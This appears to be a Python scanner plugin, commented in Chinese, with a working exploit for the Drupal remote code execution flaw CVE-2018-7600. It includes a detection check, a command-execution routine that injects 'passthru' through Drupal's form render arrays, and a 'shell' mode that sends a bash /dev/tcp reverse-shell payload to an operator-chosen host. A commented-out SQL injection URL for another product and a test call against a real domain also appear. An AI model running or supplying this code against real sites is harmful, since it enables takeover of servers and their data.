import requests
from bs4 import BeautifulSoup
import re
def vuln_info():
    info={
        'vuln_name': 'Drupal_RCE',  #漏洞名称
        'vuln_referer':'https://baijiahao.baidu.com/s?id=1599513089443639078&wfr=spider&for=pc',  #漏洞来源
        'vuln_author':'YaoXin',  #插件作者
        'cms_name':'Drupal',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''攻击者可以利用该漏洞攻击Drupal系统的网站，执行恶意代码，最后完全控制被攻击的网站''',
        'vuln_identifier':'''漏洞编号：CVE-2018-7600''',
        'vuln_class':'漏洞分类',
        'vuln_solution':'''修复建议。''',
        'FofaQuery_type':'socket', #socket、http
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="drupal"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':1  #是否有exp   1为有 0为无
    }
    return info
# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36 Edg/88.0.705.50',
            }
    try:
        # 返回参数
        # Result返回是否存在，
        # Result_Info为返回的信息，可以为Paylaod
        # Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
        # Error_Info无论何时都会输出
        result = {"Result": False, "Result_Info": "payload", "Debug_Info": "", "Error_Info": ""}
        result['Result_Info'] = 'payload'
        result['Debug_Info'] = 'ddd'
        ###########################################################################################################
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",}
        requests.packages.urllib3.disable_warnings()
        get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': 'whoami'}
        post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
        try:
            r = requests.post(url, params=get_params, data=post_params, verify=False,allow_redirects=False)
            rule1 = re.compile(r'<input type="hidden" name="form_build_id" value="(.*?)" />')
            form_build_id = rule1.findall(r.text)
            if form_build_id:
                get_params = {'q': 'file/ajax/name/#value/' + form_build_id[0]}
                post_params = {'form_build_id':form_build_id[0]}
                r = requests.post(url, params=get_params, data=post_params, verify=False)
                rule2 = re.compile(r'(.*?)\[{"command":"settings","settings":.*?')
                parsed_result=rule2.findall(r.text.replace('\n','').replace(' ','').replace('\r','').replace('\t',''))
                if parsed_result and len(parsed_result[0])>0:
                    result['Result'] = True
        except:
            pass


        # res = requests.get(url=url+'''/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28version%28%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23''',headers=headers,timeout=2)
        # if 'MySQL Query Error' in res.text:
        #     result['Result'] = True
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')
    

def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
    # 返回参数
    #Result返回是否成功，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":"payload"}
        #命令执行
        if exp_data['type']=='cmd':
            result['Result'] = True
            requests.packages.urllib3.disable_warnings()
            get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': exp_data['command']}
            post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
            r = requests.post(url, params=get_params, data=post_params, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            try:
                form = soup.find('form', {'id': 'user-pass'})
                form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
                if form_build_id:
                    get_params = {'q':'file/ajax/name/#value/' + form_build_id}
                    post_params = {'form_build_id':form_build_id}
                    r = requests.post(url, params=get_params, data=post_params, verify=False)
                    parsed_result = r.text.split('[{"command":"settings"')[0]
                    result['Result_Info'] = parsed_result
            except:
                result['Result_Info'] = "ERROR: Something went wrong."


        #反弹shell    
        if exp_data['type']=='shell':
            result['Result'] = True
            requests.packages.urllib3.disable_warnings()
            get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': '''bash -i >& /dev/tcp/'''+exp_data['reverse_ip']+'''/'''+exp_data['reverse_port']+'''0>&1'''}
            post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
            r = requests.post(url, params=get_params, data=post_params, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            try:
                form = soup.find('form', {'id': 'user-pass'})
                form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
                if form_build_id:
                    get_params = {'q':'file/ajax/name/#value/' + form_build_id}
                    post_params = {'form_build_id':form_build_id}
                    r = requests.post(url, params=get_params, data=post_params, verify=False)
                    parsed_result = r.text.split('[{"command":"settings"')[0]
                    result['Result_Info'] = "反弹成功"
            except:
                result['Result_Info'] = "ERROR: Something went wrong."
            # result['Result_Info'] = str(exp_data)

        # 
        result['Debug_Info'] = "1"
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')





if __name__== '__main__':
    url='http://qianxiao996.cn/'

    aa= do_poc(url, 'qianxiao996.cn', '80', 'http', heads={}, func_out=print, plugins_temp_data={})
    print(aa)
